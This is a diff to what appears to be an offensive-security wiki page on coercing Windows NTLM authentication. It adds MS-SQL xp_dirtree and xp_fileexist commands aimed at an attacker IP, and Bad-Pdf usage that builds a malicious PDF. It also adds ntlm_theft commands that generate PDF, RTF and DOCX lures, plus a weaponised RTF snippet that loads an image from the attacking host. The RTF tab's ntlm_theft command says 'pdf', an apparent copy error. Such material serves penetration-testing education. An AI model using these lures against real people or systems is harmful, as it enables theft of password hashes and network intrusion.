@@ -1,8 +1,4 @@
-# 🛠️ Living off the land
-
-{% hint style="danger" %}
-**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
-{% endhint %}
+# Living off the land
 
 ## Theory
 
@@ -33,6 +29,10 @@ On MS-SQL (Microsoft SQL) servers, the EXEC method can be used to access a remot
 
 ```bash
 EXEC master.sys.xp_dirtree '\\$ATTACKER_IP\something',1,1
+xp_dirtree '\\<attacker_IP>\any\thing'
+EXEC master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
+EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
+EXEC master..xp_fileexist '\\<attacker_IP>\anything\'
 ```
 
 ### File explorer
@@ -161,13 +161,86 @@ IconFile=\\$ATTACKER_IP\something\something.ico
 
 ### PDF documents
 
-[https://github.com/deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)
+{% tabs %}
+{% tab title="Bad-Pdf" %}
+[Bad-PDF](https://github.com/deepzec/Bad-Pdf) create malicious PDF file to steal NTLM(NTLMv1/NTLMv2) Hashes from windows machines, it utilize vulnerability disclosed by checkpoint team to create the malicious PDF file. Bad-Pdf reads the NTLM hashes using Responder listener.
 
-[https://github.com/3gstudent/Worse-PDF](https://github.com/3gstudent/Worse-PDF)
+{% hint style="info" %}
+Adobe has released a security update(APSB18-09)to address this vulnerability and CVE-2018-4993 is assigned for this vulnerability.
+{% endhint %}
+
+```bash
+$ sudo python2.7 badpdf.py
+
+      
+        ______                 __       _______  ______   ________  
+        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  | 
+          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_| 
+          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|    
+         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_     
+        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|
+
+        Author : Deepu TV ; Alias DeepZec 
+
+        =============================================================
+        
+Responder detected :/usr/sbin/responder
+Please enter Bad-PDF host IP: 
+10.10.14.8
+Please enter output file name: 
+bad.pdf
+Please enter the interface name to listen(Default eth0): 
+eth0
+[*] Starting Process.. [*]
+Bad PDF bad.pdf created
+
+```
+{% endtab %}
+
+{% tab title="ntlm_theft" %}
+The [ntlm\_theft](https://github.com/Greenwolf/ntlm\_theft) (Python) tool can be used to generate a PDF file to steal NTLM(NTLMv1/NTLMv2) Hashes. It requires user to open the document and accept the popup.
+
+```bash
+ntlm_theft.py --generate pdf --server $ATTACKER_IP --filename "@FILENAME"
+```
+{% endtab %}
+{% endtabs %}
 
 ### RTF documents
 
+{% tabs %}
+{% tab title=".rtf" %}
+Weaponizing .rtf file, which will attempt to load an image from the attacking system
+
+```
+{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://<ATTACKING_IP>/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
+```
+{% endtab %}
+
+{% tab title="ntlm_theft" %}
+The [ntlm\_theft](https://github.com/Greenwolf/ntlm\_theft) (Python) tool can be used to generate a RTF file to steal NTLM(NTLMv1/NTLMv2) Hashes. It will attempt to load an image from the attacking system:
+
+```bash
+ntlm_theft.py --generate pdf --server $ATTACKER_IP --filename "@FILENAME"
+```
+{% endtab %}
+{% endtabs %}
+
 ### MS Word documents
+
+{% tabs %}
+{% tab title="ntlm_theft" %}
+The [ntlm\_theft](https://github.com/Greenwolf/ntlm\_theft) (Python) tool can be used to generate docx files to steal NTLM(NTLMv1/NTLMv2) Hashes. It will generate three docx files using the includepicture, remotetemplate, framset technics:
+
+```bash
+$ python ntlm_theft.py --generate docx --server $ATTACKER_IP --filename "@FILENAME"
+Created: test/test-(includepicture).docx (OPEN)
+Created: test/test-(remotetemplate).docx (OPEN)
+Created: test/test-(frameset).docx (OPEN)
+Generation Complete.
+```
+{% endtab %}
+{% endtabs %}
 
 ### Lock screen wallpaper
 
